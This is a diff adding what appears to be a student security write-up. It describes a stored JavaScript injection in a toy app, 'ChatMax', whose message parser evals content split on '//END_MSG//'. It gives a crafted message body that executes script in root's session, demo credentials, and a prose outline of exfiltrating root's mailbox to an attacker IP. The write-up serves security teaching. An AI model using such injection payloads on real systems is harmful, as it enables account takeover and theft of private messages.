@@ -1,0 +1,31 @@
+The ChatMax application has a big security flaw in the way that it handles the
+sending of messages. In chatmax-min.js, we see that the code naively looks for
+"//END_MSG//" while parsing the JavaScript variable this.responseText. Thus, we
+can send a custom message that trick this code while it's parsing and execute
+arbitrary JavaScript. One can do this as follows:
+
+1) Log in as any other user (e.g. username: karp, password: 123456)
+2) Click "Send new message"
+3) Send the following message:
+	To: root
+	Subject: Evil
+	Body: ", "from": "blah", "subject": "Blah"} //END_MSG// 1;})(); window.alert("Evil!"); console.log(this.responseText); (function() { return {"date": "Sat Oct 24 23:41:40 2015", "body": "I had a great time at your party, but I must admit that I have hidden your magician's hat. Orange Julius told me to do it!", "from": "Drake", "subject": "You better respond!"} //END_MSG// {"date": "Evil", "body": "Evil", "from": "Evil", "subject": "Evil
+4) Click Send
+5) Reload the page and login as root (password: bond007)
+6) You will see an alert pop up and say "Evil"
+7) You will see this.responseText (which contains all of root's messages) logged
+   to the console. 
+
+The code for fetchMessages() in chatmax-min.js basically parses and puts a 
+bunch of JS functions into an array and then calls eval() on all of them. 
+What the above code does is prematurely (but correctly) end the current message 
+that is being parsed, add arbitrary JavaScript code (one window.alert() and one 
+console.log()), then correctly end the original message. Thus, when 
+fetchMessages() is called on root's account, which root logs in to regularly, 
+the arbitrary JavaScript code that was added by the user karp will get executed, 
+therefore causing all hell to break loose. For example, one easy way to leak
+root's mailbox would be to send a GET request to a IP the attacker is listening
+to using XMLHttpRequest() - they just have to grab the HTML of the div with id
+"messagesDiv", put it in the GET request, and send it to some IP address the attacker
+is listening on. Because karp is able to execute arbitrary JavaScript when the user 
+root logs in, we have successfully demonstrated an exfiltration attack.  
